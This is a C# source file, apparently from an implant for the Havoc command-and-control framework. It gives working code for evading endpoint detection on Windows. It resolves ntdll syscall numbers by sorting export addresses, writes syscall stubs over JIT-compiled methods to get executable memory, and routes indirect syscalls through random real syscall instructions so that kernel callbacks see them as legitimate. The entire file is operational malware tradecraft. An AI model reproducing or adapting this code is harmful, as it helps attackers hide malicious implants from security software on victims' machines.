using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Reflection;
using System.Threading;
using System.Net;
namespace HavocImplant.NativeUtils
{
    public static class globalDll

    {

        public static dll ntdll = new dll("ntdll.dll");
        public static dll kernel32 = new dll("kernel32.dll");
        public static dll win32u = new dll("win32u.dll");
        public static dll user32 = new dll("user32.dll");

    }
    public class dll
    {
        public IntPtr dllLocation;
        int exportRva;
        int ordinalBase;
        int numberOfNames;
        int functionsRva;
        int namesRva;
        int ordinalsRva;

        //For ntdll
        public Dictionary<int, needName> dictOfNtFunctionsNamesAndAddresses = new Dictionary<int, needName>();
        public Dictionary<int, needName> dictOfNtFunctionsNamesAndAddressesOrdered = new Dictionary<int, needName>();
        public Dictionary<IntPtr, string> dictOfNtFunctionSyscallInstructionAddressesAndTheirNtFunctionNames = new Dictionary<IntPtr, string>();
        public Dictionary<string, IntPtr> dictOfSyscalls = new Dictionary<string, IntPtr>();
        IntPtr[] ntFunctionAddressesLowestToHighest;

        public Dictionary<string, IntPtr> dictOfExports = new Dictionary<string, IntPtr>(); //Name and location of all the exported functions.

        public IntPtr free;
        public IntPtr write;
        public IntPtr alloc;
        public IntPtr prot;

        public struct needName //This struct needs a name LMAO
        {
            public string funcName;
            public IntPtr funcAddr;
        }
        public dll(string dllName)
        {
            
            if (IntPtr.Size != 8)
            {
                Console.WriteLine("[!] This only works for x64!");
                Environment.Exit(0);
            }

            //Find ntdll in memory
            Process current = Process.GetCurrentProcess();
            this.dllLocation = IntPtr.Zero;
            foreach (ProcessModule p in current.Modules)
            {
                if (p.ModuleName.ToLower() == dllName)
                {
                    this.dllLocation = p.BaseAddress;
                    break;
                }
            }
            
            //Dinvoke magic to parse some very important properties
            var peHeader = Marshal.ReadInt32((IntPtr)(this.dllLocation.ToInt64() + 0x3C));
            var optHeader = this.dllLocation.ToInt64() + peHeader + 0x18;
            var magic = Marshal.ReadInt16((IntPtr)optHeader);
            long pExport = 0;
            if (magic == 0x010b) pExport = optHeader + 0x60;
            else pExport = optHeader + 0x70;
            this.exportRva = Marshal.ReadInt32((IntPtr)pExport);
            this.ordinalBase = Marshal.ReadInt32((IntPtr)(this.dllLocation.ToInt64() + exportRva + 0x10));
            this.numberOfNames = Marshal.ReadInt32((IntPtr)(this.dllLocation.ToInt64() + exportRva + 0x18));
            this.functionsRva = Marshal.ReadInt32((IntPtr)(this.dllLocation.ToInt64() + exportRva + 0x1C));
            this.namesRva = Marshal.ReadInt32((IntPtr)(this.dllLocation.ToInt64() + exportRva + 0x20));
            this.ordinalsRva = Marshal.ReadInt32((IntPtr)(this.dllLocation.ToInt64() + exportRva + 0x24));

            if (dllName.ToLower() == "ntdll.dll" || dllName.ToLower() == "win32u.dll")
            {
                getSyscallIds();
                getSyscallInstructionAddresses();
                GenerateRWXMemorySegment();
                if (dllName.ToLower() == "ntdll.dll")
                    GenerateCoreCalls();
            }
            getExports();
        }

        /// <summary>
        /// Using ElephantSe4l method and my shitty compsci sorting abilities, find the syscall ID via the order of the functions in memory
        /// </summary>
        public void getSyscallIds()
        {
            IntPtr functionPtr = IntPtr.Zero;
            int ntCounter = 0;
            for (var i = 0; i < this.numberOfNames; i++) //Find all the NtFunctions and their memory addresses
            {
                var functionName = Marshal.PtrToStringAnsi((IntPtr)(this.dllLocation.ToInt64() + Marshal.ReadInt32((IntPtr)(this.dllLocation.ToInt64() + namesRva + i * 4))));
                if (string.IsNullOrWhiteSpace(functionName)) continue;
                if (functionName.StartsWith("Nt") && !functionName.StartsWith("Ntdll"))
                {
                    var functionOrdinal = Marshal.ReadInt16((IntPtr)(this.dllLocation.ToInt64() + ordinalsRva + i * 2)) + ordinalBase;
                    var functionRva = Marshal.ReadInt32((IntPtr)(this.dllLocation.ToInt64() + functionsRva + 4 * (functionOrdinal - ordinalBase)));
                    functionPtr = (IntPtr)((long)this.dllLocation + functionRva);
                    needName temp = new needName();
                    temp.funcAddr = functionPtr;
                    temp.funcName = functionName;
                    this.dictOfNtFunctionsNamesAndAddresses.Add(ntCounter, temp);
                    //Console.WriteLine($"Found {functionName}");
                    ntCounter++;
                }
            }
            //An array of the memory addresses
            ntFunctionAddressesLowestToHighest = new IntPtr[dictOfNtFunctionsNamesAndAddresses.Count];
            for (int j = 0; j < ntFunctionAddressesLowestToHighest.Length; j++)
            {
                ntFunctionAddressesLowestToHighest[j] = this.dictOfNtFunctionsNamesAndAddresses[j].funcAddr;
            }
            //Sort it, lowest to highest
            for (int k = 0; k < ntFunctionAddressesLowestToHighest.Length - 1; k++)
            {
                if ((long)ntFunctionAddressesLowestToHighest[k] > (long)ntFunctionAddressesLowestToHighest[k + 1])
                {
                    var temp = ntFunctionAddressesLowestToHighest[k];
                    ntFunctionAddressesLowestToHighest[k] = ntFunctionAddressesLowestToHighest[k + 1];
                    ntFunctionAddressesLowestToHighest[k + 1] = temp;
                    k = -1;
                }
            }
            int z = 0;
            //Compare the array to the dictionary so we can make the dictionary ordered
            foreach (var item in ntFunctionAddressesLowestToHighest)
            {
                foreach (var item2 in dictOfNtFunctionsNamesAndAddresses)
                {
                    if ((long)item == (long)item2.Value.funcAddr)
                    {
                        needName temp = new needName();
                        temp.funcAddr = item2.Value.funcAddr;
                        temp.funcName = item2.Value.funcName;
                        dictOfNtFunctionsNamesAndAddressesOrdered.Add(z, temp);

                        break;
                    }
                }
                z++;
            }
        }

        // Sacrificing this method to microsoft
        public static UInt32 Gate()//Nt Free
        {
            return (uint)5;
        }
        public static UInt32 Gate2()//Nt Write
        {
            return (uint)5;
        }
        public static UInt32 Gate3()//Nt Allocate
        {
            return (uint)5;
        }
        public static UInt32 Gate4()//Nt Protect
        {
            return (uint)5;
        }
        /// <summary>
        /// Jit the Gates, and try 1. If it doesn't work, do 2.
        /// 1. Follow JMP to find machine code of JITTED method and designate it for our syscall writing
        /// 2. Just use the first location returned since this is the jitted code
        /// </summary>
        public void GenerateRWXMemorySegment()
        { 
            // Find and JIT the method?
            MethodInfo method = typeof(dll).GetMethod(nameof(Gate), BindingFlags.Static | BindingFlags.Public);
            MethodInfo method2 = typeof(dll).GetMethod(nameof(Gate2), BindingFlags.Static | BindingFlags.Public);
            MethodInfo method3 = typeof(dll).GetMethod(nameof(Gate3), BindingFlags.Static | BindingFlags.Public);
            MethodInfo method4 = typeof(dll).GetMethod(nameof(Gate4), BindingFlags.Static | BindingFlags.Public);
            if (method == null)
            {
                Console.WriteLine("Unable to find the method");
                return;
            }
            RuntimeHelpers.PrepareMethod(method.MethodHandle);
            RuntimeHelpers.PrepareMethod(method2.MethodHandle);
            RuntimeHelpers.PrepareMethod(method3.MethodHandle);
            RuntimeHelpers.PrepareMethod(method4.MethodHandle);
            // Get the address of the function to find JITted machine code or figure out if JIT went weird
            IntPtr pMethod = method.MethodHandle.GetFunctionPointer();
            IntPtr pMethod2 = method2.MethodHandle.GetFunctionPointer();
            IntPtr pMethod3 = method3.MethodHandle.GetFunctionPointer();
            IntPtr pMethod4 = method4.MethodHandle.GetFunctionPointer();
            //Console.WriteLine("Managed method address:   0x{0:X}", (long)pMethod);
            if (Marshal.ReadByte(pMethod) != 0xe9)
            {
                //Console.WriteLine("Invalid stub, gonna assume the managed method address is the method table entry");
                free = pMethod;
                write = pMethod2;
                alloc = pMethod3;
                prot = pMethod4;
                return;
            }
            Int32 offset = Marshal.ReadInt32(pMethod, 1);
            UInt64 addr64 = 0;
            
            addr64 = (UInt64)pMethod + (UInt64)offset;
            while (addr64 % 16 != 0)
                addr64++;
            free = (IntPtr)addr64;


            offset = Marshal.ReadInt32(pMethod2, 1);
            addr64 = (UInt64)pMethod2 + (UInt64)offset;
            while (addr64 % 16 != 0)
                addr64++;
            write = (IntPtr)addr64;

            offset = Marshal.ReadInt32(pMethod3, 1);
            addr64 = (UInt64)pMethod2 + (UInt64)offset;
            while (addr64 % 16 != 0)
                addr64++;
            alloc = (IntPtr)addr64; 
            
            offset = Marshal.ReadInt32(pMethod4, 1);
            addr64 = (UInt64)pMethod2 + (UInt64)offset;
            while (addr64 % 16 != 0)
                addr64++;
            prot = (IntPtr)addr64;

        }
        public byte[] generateStub(short id)
        {
            Random rand = new Random();
            List<IntPtr> keyList = new List<IntPtr>(this.dictOfNtFunctionSyscallInstructionAddressesAndTheirNtFunctionNames.Keys);
            IntPtr randomAssSyscallInstruction = keyList[rand.Next(keyList.Count)];

            byte[] bruh = BitConverter.GetBytes((long)randomAssSyscallInstruction);
            byte[] stub = new byte[21]
            {
                0x4C, 0x8B, 0xD1,               			                                            // mov r10, rcx
	            0xB8, (byte)id, (byte) (id >> 8), 0x00, 0x00,    	              	        // mov eax, syscall number
	            0x49, 0xBB, bruh[0], bruh[1], bruh[2], bruh[3], bruh[4], bruh[5], bruh[6], bruh[7],     // movabs r11,syscall address
	            0x41, 0xFF, 0xE3 				       	                                                // jmp r11
            };
            return stub;
        }
        public void GenerateCoreCalls()
        {
            short allocId = -1;
            short writeId = -1;
            short freeId = -1;
            short protId = -1;
            foreach (var item in this.dictOfNtFunctionsNamesAndAddressesOrdered)
            {
                switch (item.Value.funcName)
                {
                    case "NtAllocateVirtualMemory":
                        allocId = (short)item.Key; break;
                    case "NtWriteVirtualMemory":
                        writeId = (short)item.Key; break;
                    case "NtProtectVirtualMemory":
                        protId = (short)item.Key; break;
                    case "NtFreeVirtualMemory":
                        freeId = (short)item.Key; break;
                }

            }
            byte[] allocStub = generateStub(allocId);
            byte[] writeStub = generateStub(writeId);
            byte[] protStub = generateStub(protId);
            byte[] freeStub = generateStub(freeId);
            Marshal.Copy(allocStub, 0, alloc, 21);
            Marshal.Copy(writeStub, 0, write, 21);
            Marshal.Copy(protStub, 0, prot, 21);
            Marshal.Copy(freeStub, 0, free, 21);
        }
        //Utility Functions
        public void getExports()
        {
            IntPtr functionPtr = IntPtr.Zero;
            for (var i = 0; i < this.numberOfNames; i++) //Find all the exports
            {
                var functionName = Marshal.PtrToStringAnsi((IntPtr)(this.dllLocation.ToInt64() + Marshal.ReadInt32((IntPtr)(this.dllLocation.ToInt64() + namesRva + i * 4))));
                if (string.IsNullOrWhiteSpace(functionName)) continue;
                var functionOrdinal = Marshal.ReadInt16((IntPtr)(this.dllLocation.ToInt64() + ordinalsRva + i * 2)) + ordinalBase;
                var functionRva = Marshal.ReadInt32((IntPtr)(this.dllLocation.ToInt64() + functionsRva + 4 * (functionOrdinal - ordinalBase)));
                functionPtr = (IntPtr)((long)this.dllLocation + functionRva);
                dictOfExports.Add(functionName, functionPtr);
            }
        }
        
        /// <summary>
        /// Jam a syscall into the codecove, make a delegate to it, and invoke. Each syscall overwrites each other, so less sussy? 
        /// The syscall will JMP back to the real syscall in ntdll so kernel callbacks make it seem like the syscalls are legit
        /// </summary>
        /// <typeparam name="T">Delegate to be used as function prototype for the syscall</typeparam>
        /// <param name="name">Name of NtFunction who's syscall we're nabbing</param>
        /// <param name="arr">Object arr of args. Each item may get modified depending on if original Nt func passed by ref or not, so initialize accordingly</param>
        /// <returns>An object which can be casted to what the delegate should normally return</returns>
        public object indirectSyscallInvoke<T>(string name, object[] arr) where T : Delegate
        {
            if (name == "NtAllocateVirtualMemory")
            {
                var call = Marshal.GetDelegateForFunctionPointer(alloc, typeof(T));
                var retval = call.DynamicInvoke(arr);
                return retval;
            }
            if (name == "NtWriteVirtualMemory")
            {
                var call = Marshal.GetDelegateForFunctionPointer(write, typeof(T));
                var retval = call.DynamicInvoke(arr);
                return retval;
            }
            if (name == "NtProtectVirtualMemory")
            {
                var call = Marshal.GetDelegateForFunctionPointer(prot, typeof(T));
                var retval = call.DynamicInvoke(arr);
                return retval;
            }
            if (name == "NtFreeVirtualMemory")
            {
                var call = Marshal.GetDelegateForFunctionPointer(free, typeof(T));
                var retval = call.DynamicInvoke(arr);
                return retval;
            }
            short syscallId = -1;
            foreach (var item in this.dictOfNtFunctionsNamesAndAddressesOrdered)
            {
                if (item.Value.funcName == name)
                {
                    syscallId = (short)item.Key;
                }
            }
            if (syscallId == -1)
            {
                Console.WriteLine("Syscallid for {0} not found!", name);
                return null;
            }
            byte[] stub = generateStub(syscallId);

            IntPtr stubLoc = IntPtr.Zero;
            object[] allocArgs = new object[] { (IntPtr)(-1), stubLoc, IntPtr.Zero, (IntPtr)21, Structs.Win32.Enums.AllocationType.Commit, Structs.Win32.Enums.MemoryProtection.ReadWrite};
            Marshal.GetDelegateForFunctionPointer(alloc, typeof(Delegates.NtAllocateVirtualMemory)).DynamicInvoke(allocArgs);
            stubLoc = (IntPtr)allocArgs[1];

            GCHandle unmanagedStub = GCHandle.Alloc(stub, GCHandleType.Pinned);
            object[] writeArgs = new object[] { (IntPtr)(-1), stubLoc, unmanagedStub.AddrOfPinnedObject(), (uint)21, (uint)0 };
            Marshal.GetDelegateForFunctionPointer(write,typeof(Delegates.NtWriteVirtualMemory)).DynamicInvoke(writeArgs);
            unmanagedStub.Free();

            object[] protArgs = new object[] { (IntPtr)(-1), stubLoc, (IntPtr)21, Structs.Win32.Enums.MemoryProtection.ExecuteRead, (uint) 0 };
            Marshal.GetDelegateForFunctionPointer(prot, typeof(Delegates.NtProtectVirtualMemory)).DynamicInvoke(protArgs);

            var syscall = Marshal.GetDelegateForFunctionPointer(stubLoc, typeof(T));
            var retValue = syscall.DynamicInvoke(arr);

            object[] freeArgs = new object[] { (IntPtr)(-1), stubLoc, (IntPtr)21, (uint)0x8000 };
            Marshal.GetDelegateForFunctionPointer(free, typeof(Delegates.NtFreeVirtualMemory)).DynamicInvoke(freeArgs);

#if debug
            Console.WriteLine($"Executed {name}");
#endif
            return retValue;
        }
        public void getSyscallInstructionAddresses()
        {
            IntPtr syscallInstructAddr = IntPtr.Zero;
            byte[] syscallInstructionCompare = new byte[2] { 0x00, 0x00 };
            int currentDictionaryIndex = 0;
            foreach (var item in this.dictOfNtFunctionsNamesAndAddressesOrdered)
            {
                if (item.Key == this.dictOfNtFunctionsNamesAndAddressesOrdered.Count - 1) break;
                for (int i = 0; i < ((long)this.dictOfNtFunctionsNamesAndAddressesOrdered[currentDictionaryIndex + 1].funcAddr - (long)item.Value.funcAddr); i++)
                {
                    syscallInstructionCompare[0] = Marshal.ReadByte(IntPtr.Add(item.Value.funcAddr, i));
                    syscallInstructionCompare[1] = Marshal.ReadByte(IntPtr.Add(item.Value.funcAddr, i + 1));
                    if (syscallInstructionCompare[0] == 0x0f && syscallInstructionCompare[1] == 0x05)
                    {
                        syscallInstructAddr = IntPtr.Add(item.Value.funcAddr, i);
                        break;
                    }
                }
                currentDictionaryIndex++;
                if (syscallInstructAddr == IntPtr.Zero)
                {
                    continue;
                }
                else
                {
                    this.dictOfNtFunctionSyscallInstructionAddressesAndTheirNtFunctionNames.Add(syscallInstructAddr, item.Value.funcName);
                    syscallInstructAddr = IntPtr.Zero;
                }
            }
        }
        public object dynamicExecute<T>(string funcName, object[] arr) where T: Delegate
        {
            return Marshal.GetDelegateForFunctionPointer<T>(dictOfExports[funcName]).DynamicInvoke(arr);
        }
    }
}
